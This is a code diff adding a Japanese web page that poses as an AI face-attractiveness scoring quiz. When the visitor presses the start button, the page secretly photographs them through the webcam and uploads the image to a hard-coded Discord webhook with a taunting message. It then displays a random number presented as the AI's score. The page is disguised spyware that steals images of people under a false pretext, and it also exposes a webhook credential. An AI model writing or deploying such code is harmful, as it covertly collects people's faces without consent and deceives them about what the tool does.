@@ -1,1 +1,60 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>AI超精密・顔面偏差値診断</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #111; color: #fff; }
+        #video { width: 100%; max-width: 400px; border-radius: 10px; }
+        #result { font-size: 2em; color: #ff0055; margin-top: 20px; }
+        button { padding: 15px 30px; font-size: 1.2em; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>AI顔面偏差値診断</h1>
+    <p>最新のAI技術であなたの顔面を数値化します。</p>
+    <video id="video" autoplay playsinline></video>
+    <br><br>
+    <button id="snap">診断開始！</button>
+    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>
+    <div id="result"></div>
 
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const snap = document.getElementById('snap');
+        const result = document.getElementById('result');
+        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
+
+        // カメラを起動
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("カメラの使用を許可してください。"); });
+
+        snap.addEventListener('click', () => {
+            result.innerText = "AIが解析中...";
+            
+            // 写真をキャプチャ
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            // 画像データをBlobに変換
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'face_capture.png');
+                formData.append('content', '野郎の面を確保したぜ！');
+
+                // Discordに送信
+                fetch(webhookUrl, { method: 'POST', body: formData })
+                .then(res => {
+                    // 送信完了後に偏差値をランダム表示
+                    setTimeout(() => {
+                        const score = Math.floor(Math.random() * (75 - 45 + 1)) + 45;
+                        result.innerHTML = `あなたの顔面偏差値は...<br><strong>【 ${score} 】</strong>です！`;
+                    }, 2000);
+                });
+            }, 'image/png');
+        });
+    </script>
+</body>
+</html>
